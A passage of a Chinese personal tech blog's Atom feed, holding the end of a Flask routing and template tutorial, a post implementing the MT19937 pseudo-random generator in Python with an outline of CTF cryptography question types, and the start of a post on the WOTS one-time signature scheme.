class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902234501110.png" alt="image-20250902234501110"></p><h2 id="静态文件与模版">静态文件与模版</h2><ul><li><p>静态文件和模版：管理静态文件和动态渲染HTML模版。例如：<code>.html、.png、.jpg</code>文件</p></li><li><p>这个其实也是路由函数的一种返回类型，是直接返回文件。需要使用<code>flask</code>中的<code>flask.render_template()</code>函数，使用<code>flask.render_template()</code>，该函数会从当前目录下的一个名为<code>templates</code>的目录作为根目录去寻找对应的文件。</p></li></ul><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902235026791.png" alt="image-20250902235026791"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/return_html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_html_func</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;./example.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902235038747.png" alt="image-20250902235038747"></p><h2 id="路由优先级">路由优先级</h2><ul><li>当存在两个相同的路由时，使用<code>URL</code>访问路由函数时，到底是先调用哪个路由函数，这个就需要使用路由优先级确定。</li><li>路由优先级原则：哪个路由函数先被定义，先被定义的路由函数优先级就会更高。访问该路径的时候，使用的路由函数始终是<code>func1</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/my_route&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Func1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/my_route&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Func2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902235353791.png" alt="image-20250902235353791"></p><h1 id="flask视图函数">flask视图函数</h1><ul><li>视图函数其实就是与<code>flask</code>路由绑定起来的函数，该函数被称为视图函数。视图函数一般最经常用来处理前端发送过来的请求，后端的逻辑一般都在<code>flask</code>视图函数中编写。</li><li>对于<code>flask</code>视图函数，主要就是前后端交互的处理，一般就是接收和处理前端发送过来的数据，然后将处理结果返回给前端，从而达到前后端交互目的。</li></ul><h2 id="获取请求数据">获取请求数据</h2><h2 id="返回响应">返回响应</h2><h2 id="处理请求相应">处理请求相应</h2><h2 id="处理错误">处理错误</h2><h2 id="视图函数装饰器">视图函数装饰器</h2><ul><li><p>函数装饰器是<code>python</code>的一个特性，而<code>flask</code>框架有一些定义好的函数装饰器，接下来就是要学习<code>flask</code>框架的视图函数装饰器。</p></li><li><p>对于视图函数修饰器，效果有点类似于<code>@app.route</code>这个功能，<code>route</code>是对视图函数将URL进行绑定。而视图函数修饰器也类似于用来绑定函数的。接下来介绍几个修饰器的关键字，用户还可以<strong>自定义视图函数修饰器</strong>：</p><ul><li>路由相关：<ul><li><code>@app.get('/path')</code>：相当于<code>@app.route('/path', methods=['GET'])</code>，只响应<code>GET</code>请求</li><li><code>@app.post('/path')</code>：相当于<code>@app.route('/path', methods=['POST'])</code>，只响应<code>post</code>请求</li><li><code>@app.put('/path')</code> 、<code>@app.delete('/path')</code> 、 <code>@app.patch('/path')</code>：<br>分别对应 PUT、DELETE、PATCH 请求。</li><li><code>@app.route('/path',methods=['GET','POST'])</code>：可以处理多个请求。</li></ul></li><li>请求钩子：<ul><li><code>@app.before_request</code>：在每个请求之前运行的函数。</li><li><code>@app.after_request</code>：在每个请求处理之后的函数</li><li><code>@app.teardown_request</code>：在请求结束之后运行的函数，用于清理工作</li></ul></li><li>错误处理修饰器：<ul><li><code>@app.errorhandler(404)</code>：捕获404错误，返回自定义页面</li><li><code>@app.errorhandler(Exception)</code>：捕获所有异常，可返回统一的错误信息</li></ul></li><li>蓝图相关修饰器：<ul><li><code>@bp.route('/path')</code>：类似于<code>@app.route('/path')</code>，但是只作用于蓝图</li><li><code>@bp.before_app_request</code>：只作用于蓝图的钩子函数。</li></ul></li></ul></li></ul><h1 id="flask模版渲染">flask模版渲染</h1><ul><li>在web开发中，模版一般是指带有占位符的<code>HTML</code>文件，这样其实就能根据一些用户信息或者用户的请求在前端显示不同的信息。</li></ul><h1 id="项目1登录界面">项目1—登录界面</h1><h2 id="阶段1">阶段1</h2><h2 id="阶段2">阶段2</h2><h2 id="阶段3">阶段3</h2>]]></content>
    
    
    <summary type="html">前言：5天时间内要完成一个课设，还是赶紧学吧。</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="后端" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/%E5%90%8E%E7%AB%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>伪随机数生成器MT19937</title>
    <link href="http://iyheart.github.io/2025/09/02/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/MT19937%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>http://iyheart.github.io/2025/09/02/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/MT19937%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/</id>
    <published>2025-09-02T00:04:49.000Z</published>
    <updated>2025-09-02T00:42:10.409Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>做到相关的题目就直接来先学习一下。</p></li><li><p>参考博客：<a href="https://seandictionary.top/mt19937/">https://seandictionary.top/mt19937/</a></p></li><li><p>参考文章：<a href="https://en.wikipedia.org/wiki/Mersenne_Twister">Mersenne Twister - Wikipedia</a></p></li><li><p>参考博客：<a href="https://hasegawaazusa.github.io/mersenne-twister-note.html">https://hasegawaazusa.github.io/mersenne-twister-note.html</a></p></li><li><p>参考博客：<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">https://huangx607087.online/2021/07/10/Explore-MT19937/</a></p></li><li><p>参考博客：<a href="https://xenny.wiki/posts/crypto/PRNG/MT19937.html">MT19937 分析 | Xenny 的博客</a>，<code>Xenny</code>老师这篇将如何逆向MT19937讲的挺好的。</p></li></ul><h1 id="mt19937">MT19937</h1><ul><li>对于<code>MT19937</code>的介绍，已经在前面的一篇文章中介绍过了，接下来就具体学习一下<code>MT19937</code>具体的算法过程。</li><li>对于<code>MT19937</code>的应用，其实很多语言的<code>random</code>这个库都使用的是<code>MT19937</code>这个算法，比如<code>python</code>、<code>PHP</code>和<code>Matlab</code>，并且从<code>C++11</code>开始，<code>C++</code>也可以使用梅森旋转算法（MT19937）,对应的命名空间为<code>std::mt19937_64</code>。</li><li><code>MT19937</code>这个伪随机数生成器，目前被视为最好的随机数算法。</li><li>做个统一：以下文章中的内容都以<code>MT19937</code>来表示该算法。</li></ul><h2 id="mt19937原始版本">MT19937原始版本</h2><ul><li><p>该版本其实就是使用<code>32</code>位的整数作为该算法的种子。之后的<code>64</code>位是后来的一个变种版本，初学的时候一开始只要学原始版本即可。</p></li><li><p>接下来我们一步一步介绍一下<code>MT19937</code>的具体过程，采用的是该博客的方式：<a href="https://hasegawaazusa.github.io/mersenne-twister-note.html%EF%BC%8C%E5%85%88%E5%88%86%E5%B8%83%E4%BB%8B%E7%BB%8D%EF%BC%8C%E6%9C%80%E5%90%8E%E5%86%8D%E5%B0%86%E7%AE%97%E6%B3%95%E6%9C%89%E4%B8%AA%E6%95%B4%E4%BD%93%E6%A6%82%E5%BF%B5%E3%80%82">https://hasegawaazusa.github.io/mersenne-twister-note.html，先分布介绍，最后再将算法有个整体概念。</a></p></li><li><p>代码采用的是这篇博客的代码，实现的比较简洁：<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">https://huangx607087.online/2021/07/10/Explore-MT19937/</a></p></li><li><p>这个算法其实总的来说有三个部分，分别就是<code>初始化操作</code>、<code>获得伪随机数(提取伪随机数)</code>、<code>梅森旋转操作</code></p></li></ul><h3 id="初始化">初始化</h3><ul><li>代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于Python中支持无限长度的整型,所以我们需要定义一个函数来实现32位整型的提取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span> &amp; x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个MT19937的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,seed</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        先对数据进行初始化操作,并且定义一些固定的值以及用户传进来的值</span></span><br><span class="line"><span class="string">        1.mt:表示624个初始状态的寄存器,这里使用长度为624的列表表示</span></span><br><span class="line"><span class="string">        2.seed:表示用户传入的随机数种子,并将该种子赋值给mt[0],即第一个寄存器</span></span><br><span class="line"><span class="string">        3.mtinit: 是用于初始化的一个常数,该数可以用于提高初始种子的扩散效果</span></span><br><span class="line"><span class="string">        4.mti:这里先设定一个初值0,在初始化的时候用不到</span></span><br><span class="line"><span class="string">        5.最后进行623次的for循环,通过递推的方式为每一个初始状态寄存器都进行初始化</span></span><br><span class="line"><span class="string">        (也就是说初始状态寄存器的值与seed关联性是比较强的)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.mt = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti=<span class="number">0</span></span><br><span class="line">        self.mtinit = <span class="number">0x6c078965</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(self.mtinit * (self.mt[i-<span class="number">1</span>] ^ self.mt[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br></pre></td></tr></table></figure><ul><li>这里主要就是利用用户传入的种子，对该<code>MT19937</code>中的初始状态寄存器做一个初始化操作，使得<code>624</code>个初始化状态寄存器都有对应的值。</li></ul><h3 id="提取伪随机数">提取伪随机数</h3><ul><li>代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getbits</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1.这个步骤就是利用之前生成的624个初始状态寄存器的值,通过梅森旋转以及位运算</span></span><br><span class="line"><span class="string">      从而计算出这一次触发时我们得到的伪随机数的值</span></span><br><span class="line"><span class="string">    2.mti其实这里就是记录用户获取随机数的此时,以624为一个周期,每获取一个周期后就会触发梅森旋转(也被称为回火策略)</span></span><br><span class="line"><span class="string">    3.一开始mti为0的时候就会先触发一次梅森旋转</span></span><br><span class="line"><span class="string">    4. 2636928640(即0x9D2C5680)和4022730752(即0xEFC60000)都是常量。前者混合中位，掩盖模式特征;后者混合高位，增强熵</span></span><br><span class="line"><span class="string">    5. 这些常数保证了输出的质量和周期长度,并不能随意修改</span></span><br><span class="line"><span class="string">    :return: 返回值就是一个32位的整数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.mti==<span class="number">0</span>:</span><br><span class="line">        self.twist()</span><br><span class="line">    y = self.mt[self.mti]</span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">11</span> <span class="comment"># 先左移后异或,位移运算优先级高于异或</span></span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">7</span> &amp; <span class="number">2636928640</span> <span class="comment"># 先左移,再进行与操作,最后再异或</span></span><br><span class="line">    y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">    y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">    self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">    <span class="keyword">return</span> _int32(y)</span><br></pre></td></tr></table></figure><h3 id="梅森旋转操作">梅森旋转操作</h3><ul><li>代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    直接将624个初始状态寄存器进行一个梅森旋转操作，</span></span><br><span class="line"><span class="string">    旋转过程涉及位运算以及与当前初始状态寄存器i以及第i+397个寄存器的状态有关</span></span><br><span class="line"><span class="string">    :return: 无返回值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">624</span>):</span><br><span class="line">        <span class="comment"># 主要就是与一个固定的0x80000000 和 0x7fffffff</span></span><br><span class="line">        <span class="comment"># 这里就表示用第i个初始状态寄存器的最高位 + 第i+1个初始状态寄存器的第1-31位</span></span><br><span class="line">        y = _int32((self.mt[i]) &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">        <span class="comment"># 之后就是更新当前初始状态寄存器的的值</span></span><br><span class="line">        self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i+<span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">        <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br></pre></td></tr></table></figure><h3 id="总体代码">总体代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于Python中支持无限长度的整型,所以我们需要定义一个函数来实现32位整型的提取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span> &amp; x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个MT19937的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,seed</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        先对数据进行初始化操作,并且定义一些固定的值以及用户传进来的值</span></span><br><span class="line"><span class="string">        1.mt:表示624个初始状态的寄存器,这里使用长度为624的列表表示</span></span><br><span class="line"><span class="string">        2.seed:表示用户传入的随机数种子,并将该种子赋值给mt[0],即第一个寄存器</span></span><br><span class="line"><span class="string">        3.mtinit: 是用于初始化的一个常数,该数可以用于提高初始种子的扩散效果</span></span><br><span class="line"><span class="string">        4.mti:这里先设定一个初值0,在初始化的时候用不到,</span></span><br><span class="line"><span class="string">        5.最后进行623次的for循环,通过递推的方式为每一个初始状态寄存器都进行初始化</span></span><br><span class="line"><span class="string">        (也就是说初始状态寄存器的值与seed关联性是比较强的)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.mt = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti=<span class="number">0</span></span><br><span class="line">        self.mtinit = <span class="number">0x6c078965</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(self.mtinit * (self.mt[i-<span class="number">1</span>] ^ self.mt[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getbits</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        1.这个步骤就是利用之前生成的624个初始状态寄存器的值,通过梅森旋转以及位运算</span></span><br><span class="line"><span class="string">          从而计算出这一次触发时我们得到的伪随机数的值</span></span><br><span class="line"><span class="string">        2.mti其实这里就是记录用户获取随机数的此时,以624为一个周期,每获取一个周期后就会触发梅森旋转(也被称为回火策略)</span></span><br><span class="line"><span class="string">        3.一开始mti为0的时候就会先触发一次梅森旋转</span></span><br><span class="line"><span class="string">        4. 2636928640(即0x9D2C5680)和4022730752(即0xEFC60000)都是常量。前者混合中位，掩盖模式特征;后者混合高位，增强熵</span></span><br><span class="line"><span class="string">        5. 这些常数保证了输出的质量和周期长度,并不能随意修改</span></span><br><span class="line"><span class="string">        :return: 返回值就是一个32位的整数</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.mti==<span class="number">0</span>:</span><br><span class="line">            self.twist()</span><br><span class="line">        y = self.mt[self.mti]</span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">11</span> <span class="comment"># 先左移后异或,位移运算优先级高于异或</span></span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">7</span> &amp; <span class="number">2636928640</span> <span class="comment"># 先左移,再进行与操作,最后再异或</span></span><br><span class="line">        y = y ^ y &lt;&lt; <span class="number">15</span> &amp; <span class="number">4022730752</span></span><br><span class="line">        y = y ^ y &gt;&gt; <span class="number">18</span></span><br><span class="line">        self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">        <span class="keyword">return</span> _int32(y)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        直接将624个初始状态寄存器进行一个梅森旋转操作，</span></span><br><span class="line"><span class="string">        旋转过程涉及位运算以及与当前初始状态寄存器i以及第i+397个寄存器的状态有关</span></span><br><span class="line"><span class="string">        :return: 无返回值</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">624</span>):</span><br><span class="line">            <span class="comment"># 主要就是与一个固定的0x80000000 和 0x7fffffff</span></span><br><span class="line">            <span class="comment"># 这里就表示用第i个初始状态寄存器的最高位 + 第i+1个初始状态寄存器的第1-31位</span></span><br><span class="line">            y = _int32((self.mt[i]) &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>)</span><br><span class="line">            <span class="comment"># 之后就是更新当前初始状态寄存器的的值</span></span><br><span class="line">            self.mt[i] = (y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i+<span class="number">397</span>) % <span class="number">624</span>]</span><br><span class="line">            <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="mt19937-64版本">MT19937-64版本</h2><h1 id="mt19937破解">MT19937破解</h1><ul><li>这一部分是参考：<a href="https://hasegawaazusa.github.io/mersenne-twister-note.html">Mersenne Twister 梅森旋转算法笔记 | 独奏の小屋</a></li></ul><h2 id="状态破解">状态破解</h2><h2 id="矩阵状态破解">矩阵状态破解</h2><h2 id="旋转破解">旋转破解</h2><h1 id="mt19937常见题型">MT19937常见题型</h1><ul><li>这一部分主要是参考：<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">https://huangx607087.online/2021/07/10/Explore-MT19937/</a></li><li>由于初始状态寄存器一共有<code>624*32=19968个bit位</code>，所以要恢复、预测等需要<code>19968</code>个bit位，所以在<code>MT19937</code>的题型都是围绕着已知<code>bit</code>位来实现的。</li></ul><h2 id="题型1_预测随机数">题型1_预测随机数</h2><ul><li>给了足够多的数据后其实可以预测随机数的，并且有在Python中其实有现成的库可以使用，当然其实也可以自己逆向以下<code>MT19937</code>的算法，自己预测破解。</li></ul><h3 id="题目1_xyctf2025_division">题目1_XYCTF2025_Division</h3><h3 id="题目2_">题目2_</h3><h2 id="题型2_恢复随机数">题型2_恢复随机数</h2><ul><li>这类题型其实就是选用一开始生成的随机数对<code>flag</code>等密文进行加密，之后给你后续一大堆随机数，让你恢复出随机数种子和初始状态寄存器</li><li>恢复出随机数种子和初始状态寄存器，从而可以得到一开始生成的随机数值，从而获得密钥，对<code>flag</code>的密文进行解密操作。</li></ul><h3 id="题目1_xyctf2025_choice">题目1_XYCTF2025_choice</h3><h2 id="题型3_给一定量任意的bit">题型3_给一定量任意的bit</h2><ul><li>这种情况是题目给你一定量<code>任意的伪随机数的bit</code>，从而让你恢复这个伪随机数。这种情况其实就是要进行一定量的操作了。</li><li>有些情况他会给你足够的<code>bit</code>也就是<code>19968</code>个<code>bit</code>或者超过<code>19968个</code>bit，此时还是比较好恢复初始状态寄存器的。</li><li>但是有些情况题目不会给你足够数量的<code>bit</code>位，此时可能就需要对<code>MT19937</code>的旋转过程或者其他过程进行破解。从而恢复初始状态寄存器。</li></ul><h3 id="题目1_random-game">题目1_Random game</h3><h3 id="题目2_never-enough">题目2_never enough</h3><h1 id="相关库分析">相关库分析</h1><h2 id="python中random库">python中random库</h2><h2 id="c中stdmt19937_64">C++中std::mt19937_64</h2>]]></content>
    
    
    <summary type="html">前言：学习一下比较常用的MT19937</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="CRYPTO" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/"/>
    
    <category term="伪随机数" scheme="http://iyheart.github.io/categories/CTF/CRYPTO/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>一次性签名-WOTS</title>
    <link href="http://iyheart.github.io/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/"/>
    <id>http://iyheart.github.io/2025/08/31/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/%E4%B8%80%E6%AC%A1%E6%80%A7%E7%AD%BE%E5%90%8D-WOTS/</id>
    <published>2025-08-31T08:06:07.000Z</published>
    <updated>2025-09-01T14:59:56.250Z</updated>
    
    <content type="html"><![CDATA[<ul><li>参考文章：<a href="https://mp.weixin.qq.com/s/9ik2fPXH3OP1q7SrH-wLZw">https://mp.weixin.qq.com/s/9ik2fPXH3OP1q7SrH-wLZw</a></li></ul><h1 id="wots介绍">WOTS介绍</h1><ul><li><code>WOTS</code>全称为<code>Winternitz one-time signature scheme</code>，翻译过来就被叫做<code>Winternitz 一次性签名方案</code>，该数字签名为<code>Robert Winternitz</code>提出的。</li><li><code>WOTS</code>这个数字签名是<strong>基于哈希的签名算法</strong>，该签名是<code>Lamport</code>签名的改进算法，通过时间换空间的思路，减少了签名的体积。</li><li>应用场景：<ul><li>作为<code>XMSS</code>、<code>SPHINCS</code>等现代化哈希签名体系的核心组件。</li><li>适合在抗练字密码学中作为安全的签名方案</li><li>由于<code>WOTS</code>是一次性签名，通常配合<code>Merkle</code>树扩展成多次使用的签名体系。</li></ul></li></ul><h1 id="wots算法过程">WOTS算法过程</h1><ul><li>对于这个算法来说，主要包括的还是密钥生成、签名、数字签名的验证三个算法，所以<code>WOTS</code>算法过程主要就是分为<code>密钥生成</code>、<code>签名</code>、<code>数字签名的验证</code>三个过程</li><li>注意：这个数字签名算法需要多看几遍才能看明白，而且第一次看的时候会有点懵，需要从整体把握这样才能明白每一步为什么要这样选取数据。</li></ul><h2 